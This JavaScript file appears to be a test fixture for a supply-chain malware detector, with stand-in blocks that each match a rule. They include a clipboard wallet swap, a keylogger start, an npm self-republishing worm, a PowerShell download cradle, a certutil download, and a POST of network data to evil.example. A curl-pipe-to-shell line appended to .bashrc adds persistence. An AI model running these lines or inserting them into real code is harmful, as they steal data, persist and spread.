// Simulated supply-chain payload exercising the GuardDog-ported rules (GD-*).
// For detector testing only — every block below is a benign stand-in that
// matches a GD rule signature. Do NOT run this.

const cp = require('child_process');
const fs = require('fs');
const os = require('os');
const clipboardy = require('clipboardy');           // GD-001 clipboard clipper
const iohook = require('iohook');                    // GD-002 keylogging

// GD-001: swap a copied crypto address (clipboard write next to a wallet regex)
const attackerWallet = "0x1234567890abcdef1234567890abcdef12345678";
clipboardy.writeSync(attackerWallet);

// GD-002: capture keystrokes
iohook.start();

// GD-003: cryptominer / pool / stratum reference
const minerPool = "stratum+tcp://supportxmr.com:3333";

// GD-004: worm — rewrite the manifest and republish itself
fs.writeFileSync("package.json", JSON.stringify({ name: "clone", version: "9.9.9" }));
cp.exec("npm publish --access public");

// GD-005: homoglyph — the 'а' below is Cyrillic U+0430, not ASCII 'a'
const pаypalHost = "paypal.example";

// GD-006: silent, detached, hidden child process
cp.spawn("node", ["worker.js"], { detached: true, stdio: 'ignore', windowsHide: true });

// GD-007: suppress console output while running encoded code
console.log = function () {};
const decoded = String.fromCharCode(97, 108, 101, 114, 116);

// GD-008: PowerShell encoded-command download cradle
cp.exec("powershell -enc SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQA)");

// GD-009: LOLBAS network tool driven by a spawn
cp.execSync("certutil -urlcache -split -f http://evil.example/a.exe a.exe");

// GD-010: host/network enumeration feeding an exfil sink
const nics = os.networkInterfaces();
fetch("http://evil.example/collect", { method: "POST", body: JSON.stringify(nics) });

// GD-011: autostart persistence via shell rc
fs.appendFileSync(os.homedir() + "/.bashrc", "\ncurl http://evil.example/x | sh\n");
